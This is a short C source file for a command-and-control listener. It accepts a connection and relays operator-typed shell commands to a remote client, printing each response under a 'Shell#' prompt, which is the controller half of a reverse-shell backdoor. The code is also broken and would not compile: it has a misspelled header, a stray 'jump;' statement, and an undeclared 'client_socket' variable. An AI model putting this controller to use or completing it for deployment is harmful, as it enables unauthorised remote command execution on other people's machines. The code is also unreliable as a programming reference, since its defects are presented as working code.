#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinit/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

/// THIS IS A SERVER TO BE RUN ON A LINUX MACHINE

/// CHANGE CMAKELIST.TXT TO REMOVE SERVER.C FROM BUILD
/// TO BUILD gcc server.c -o server


int main() {
    int sock, client_sock;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error setting TCP socket options\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.1.1");
    server_address.sin_port = htons(50005);

    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
    listen(sock, 5);

    client_length = sizeof(client_address);
    client_sock = accept(sock, (struct sockaddr *) &client_address, &client_length);

    while(1) {
        jump;

        // Clear the buffers memory
        bzero(&response, sizeof(response));
        bzero(&buffer, sizeof(buffer));
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); // print the IP address of the client

        //gets command from stdin and stores it in buffer
        fgets(buffer, sizeof(buffer), stdin);

        // remove the newline character from the buffer, so it doesn't get sent to the client (command will not be recognized with the '/n' character)
        strtok(buffer, "\n");

        write(client_socket, buffer, sizeof(buffer)); // send the command to the client

        // CHECKS COMMANDS FROM CLIENT TO SEE IF THEY ARE QUITTING
        if(strncmp("q", buffer, 1) == 0) {
            break;
        } else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL); // receive the response from the client
            printf("%s", response); // print the response
        }
    }

}